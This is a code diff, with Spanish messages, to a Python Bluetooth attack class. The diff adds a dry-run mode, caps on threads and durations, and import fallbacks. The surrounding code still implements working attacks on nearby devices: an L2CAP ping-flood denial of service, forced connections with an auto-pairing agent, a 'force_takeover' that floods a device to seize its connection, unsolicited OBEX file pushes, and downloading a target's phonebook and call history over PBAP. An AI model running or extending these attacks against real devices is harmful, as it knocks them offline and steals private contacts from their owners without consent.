@@ -6,10 +6,35 @@ import subprocess
 import threading
 import time
 import uuid
-from bluetooth import find_service
-from PyOBEX.client import Client
-from PyOBEX.headers import Target
 
+try:
+    from bluetooth import find_service
+except ImportError:
+    def find_service(*args, **kwargs):
+        logger.warning("PyBluez no está instalado; service discovery no está disponible.")
+        return []
+
+try:
+    from PyOBEX.client import Client
+    from PyOBEX.headers import Target
+except ImportError:
+    Client = None
+    Target = object()
+
+from safety_controls import (
+    AGGRESSIVE_DOS_DURATION,
+    AGGRESSIVE_DOS_THREADS,
+    AGGRESSIVE_PACKET_SIZE,
+    DEFAULT_DOS_DURATION,
+    DEFAULT_DOS_THREADS,
+    DEFAULT_PACKET_SIZE,
+    MAX_ATTEMPTS,
+    MAX_DURATION,
+    MAX_HOLD_SECONDS,
+    MAX_PACKET_SIZE,
+    MAX_THREADS,
+    cap_value,
+)
 from utils import announce_privileged_action
 
 logger = logging.getLogger(__name__)
@@ -17,10 +42,17 @@ logger = logging.getLogger(__name__)
 class BluetoothAttacker:
     """A class to perform Bluetooth attacks."""
 
-    def __init__(self, target_mac, adapter="hci0"):
+    def __init__(self, target_mac, adapter="hci0", dry_run=False):
         """Initializes the attacker with a target MAC address and adapter."""
         self.target_mac = target_mac
         self.adapter = adapter
+        self.dry_run = dry_run
+
+    def _dry_run(self, action, commands=None):
+        print(f"[DRY-RUN] {action}")
+        for command in commands or []:
+            print(f"          {' '.join(command)}")
+        logger.info("Dry-run action for %s: %s", self.target_mac, action)
 
     @staticmethod
     def _prompt_int(prompt_text, default, minimum=1):
@@ -54,22 +86,44 @@ class BluetoothAttacker:
             return default
         return raw in {"s", "si", "y", "yes"}
 
-    def dos_attack(self, threads_count=10, package_size=600, duration=None, mode="auto"):
+    def dos_attack(self, threads_count=DEFAULT_DOS_THREADS, package_size=DEFAULT_PACKET_SIZE, duration=None, mode="auto"):
         """Performs a combined DoS attack using L2CAP flood and connection stress."""
         if mode == "interactive":
             print(f"[*] Configuración interactiva de ataque DoS contra {self.target_mac}")
             threads_count = self._prompt_int("Número de hilos totales", threads_count, minimum=1)
             package_size = self._prompt_int("Tamaño del paquete (bytes)", package_size, minimum=1)
             if duration is None:
-                duration = 120
+                duration = DEFAULT_DOS_DURATION
             duration = self._prompt_int("Duración del ataque (segundos, 0 = indefinido)", duration, minimum=0)
             if duration == 0:
                 duration = None
-        else:
-            threads_count = max(threads_count, 200)
-            package_size = max(package_size, 600)
+        elif mode == "aggressive":
+            threads_count = max(threads_count, AGGRESSIVE_DOS_THREADS)
+            package_size = max(package_size, AGGRESSIVE_PACKET_SIZE)
             if duration is None:
-                duration = 300
+                duration = AGGRESSIVE_DOS_DURATION
+        else:
+            threads_count = threads_count or DEFAULT_DOS_THREADS
+            package_size = package_size or DEFAULT_PACKET_SIZE
+            if duration is None:
+                duration = DEFAULT_DOS_DURATION
+
+        threads_count = cap_value(threads_count, MAX_THREADS, "threads")
+        package_size = cap_value(package_size, MAX_PACKET_SIZE, "package_size")
+        if duration is not None:
+            duration = cap_value(duration, MAX_DURATION, "duration")
+
+        if self.dry_run:
+            self._dry_run(
+                f"Plan DoS contra {self.target_mac} (adapter={self.adapter}, threads={threads_count}, "
+                f"packet_size={package_size}, duration={duration}, mode={mode})",
+                [
+                    ["sudo", "l2ping", "-i", self.adapter, "-s", str(package_size), "-f", self.target_mac],
+                    ["sudo", "hcitool", "-i", self.adapter, "cc", self.target_mac],
+                    ["sudo", "hcitool", "-i", self.adapter, "dc", self.target_mac],
+                ],
+            )
+            return
 
         announce_privileged_action(
             "el ataque DoS usa l2ping y hcitool con privilegios para manipular conexiones Bluetooth",
@@ -251,6 +305,14 @@ class BluetoothAttacker:
                     selected_channel = 9
                     logger.warning("No OBEX services detected for %s. Falling back to channel 9.", self.target_mac)
 
+        if self.dry_run:
+            target_channel = selected_channel or 9
+            self._dry_run(
+                f"Plan de envío OBEX de {file_path} a {self.target_mac} por canal {target_channel}",
+                [["sudo", "ussp-push", f"{self.target_mac}@{target_channel}", file_path, remote_filename]],
+            )
+            return
+
         announce_privileged_action(
             "el envío OBEX utiliza herramientas del sistema con sudo para transferir archivos al objetivo",
             "attacker.send_file",
@@ -324,9 +386,23 @@ class BluetoothAttacker:
             attempts = self._prompt_int("Número de intentos de conexión", attempts, minimum=1)
             hold_seconds = self._prompt_int("Tiempo para mantener la conexión (segundos)", hold_seconds, minimum=0)
             auto_pair = self._prompt_yes_no("¿Activar agente de auto-emparejamiento?", auto_pair)
-        else:
+        elif mode == "aggressive":
             attempts = max(attempts, 15)
             hold_seconds = max(hold_seconds, 15)
+
+        attempts = cap_value(attempts, MAX_ATTEMPTS, "attempts")
+        hold_seconds = cap_value(hold_seconds, MAX_HOLD_SECONDS, "hold_seconds")
+
+        if self.dry_run:
+            commands = [["sudo", "hcitool", "-i", self.adapter, "cc", self.target_mac]]
+            if auto_pair:
+                commands.insert(0, ["sudo", "bt-agent", "-c", "NoInputNoOutput"])
+            self._dry_run(
+                f"Plan de conexión forzada contra {self.target_mac} "
+                f"(attempts={attempts}, hold_seconds={hold_seconds}, auto_pair={auto_pair}, mode={mode})",
+                commands,
+            )
+            return
 
         announce_privileged_action(
             "el ataque de conexión forzada usa bt-agent y hcitool con privilegios de superusuario",
@@ -410,6 +486,13 @@ class BluetoothAttacker:
         print("[*] Si tiene éxito, se creará un dispositivo /dev/rfcommX.")
         print("[*] La conexión permanecerá activa. Presiona Ctrl+C para desconectar.")
 
+        if self.dry_run:
+            self._dry_run(
+                f"Plan de conexión RFCOMM a {self.target_mac} canal {channel}",
+                [["sudo", "rfcomm", "-i", self.adapter, "connect", self.target_mac, str(channel)]],
+            )
+            return
+
         announce_privileged_action(
             "establecer y liberar conexiones RFCOMM requiere permisos elevados sobre la pila Bluetooth",
             "attacker.rfcomm_connect",
@@ -432,10 +515,8 @@ class BluetoothAttacker:
             print("\n[+] Conexión RFCOMM terminada por el usuario.")
             logger.info("RFCOMM connection to %s interrupted by user", self.target_mac)
         finally:
-            print("[*] Liberando todos los dispositivos rfcomm...")
-            subprocess.run(["sudo", "rfcomm", "release", "all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            print("[+] Limpieza finalizada.")
-            logger.info("RFCOMM release executed for target %s", self.target_mac)
+            print("[*] Finalizó la sesión RFCOMM. No se ejecuta 'rfcomm release all' para no afectar otras conexiones.")
+            logger.info("RFCOMM session finished for target %s without global release.", self.target_mac)
 
     def pair_and_trust(self):
         """Guides the user to pair and trust a device using bluetoothctl."""
@@ -470,10 +551,25 @@ class BluetoothAttacker:
             dos_duration = self._prompt_int("Duración del DoS (segundos)", dos_duration, minimum=1)
             dos_threads = self._prompt_int("Número de hilos DoS", dos_threads, minimum=1)
             package_size = self._prompt_int("Tamaño de paquete L2CAP (bytes)", package_size, minimum=1)
-        else:
-            dos_threads = max(dos_threads, 200)
-            package_size = max(package_size, 600)
+        elif mode == "aggressive":
+            dos_threads = max(dos_threads, AGGRESSIVE_DOS_THREADS)
+            package_size = max(package_size, AGGRESSIVE_PACKET_SIZE)
             dos_duration = max(dos_duration, 60)
+
+        dos_threads = cap_value(dos_threads, MAX_THREADS, "threads")
+        package_size = cap_value(package_size, MAX_PACKET_SIZE, "package_size")
+        dos_duration = cap_value(dos_duration, MAX_DURATION, "duration")
+
+        if self.dry_run:
+            self._dry_run(
+                f"Plan force_takeover contra {self.target_mac} "
+                f"(channel={channel}, duration={dos_duration}, threads={dos_threads}, packet_size={package_size}, mode={mode})",
+                [
+                    ["sudo", "l2ping", "-i", self.adapter, "-s", str(package_size), "-f", self.target_mac],
+                    ["sudo", "rfcomm", "-i", self.adapter, "connect", self.target_mac, str(channel)],
+                ],
+            )
+            return
 
         print(f"[*] Iniciando Fase 1: Ataque DoS de {dos_duration} segundos para liberar la conexión.")
         logger.info(
@@ -542,6 +638,11 @@ class BluetoothAttacker:
         """
         Attempts to download the phonebook from the target device using PyOBEX.
         """
+        if Client is None:
+            print("[!] PyOBEX no está instalado; no se puede usar get_contacts.")
+            logger.error("PyOBEX is not available; get_contacts cannot run for %s", self.target_mac)
+            return
+
         print(f"[*] Buscando el servicio de Phonebook Access (PBAP) en {self.target_mac}...")
         logger.info("Scanning PBAP service on %s", self.target_mac)
         
@@ -566,6 +667,13 @@ class BluetoothAttacker:
         
         # PBAP UUID for OBEX Target header
         pbap_target_uuid = uuid.UUID("{0000112f-0000-1000-8000-00805f9b34fb}").bytes
+
+        if self.dry_run:
+            self._dry_run(
+                f"Plan de descarga PBAP desde {self.target_mac} (host={host}, port={port})",
+                [["PyOBEX", "GET", "telecom/pb.vcf"], ["PyOBEX", "GET", "telecom/ich.vcf"]],
+            )
+            return
 
         connected = False
         try:
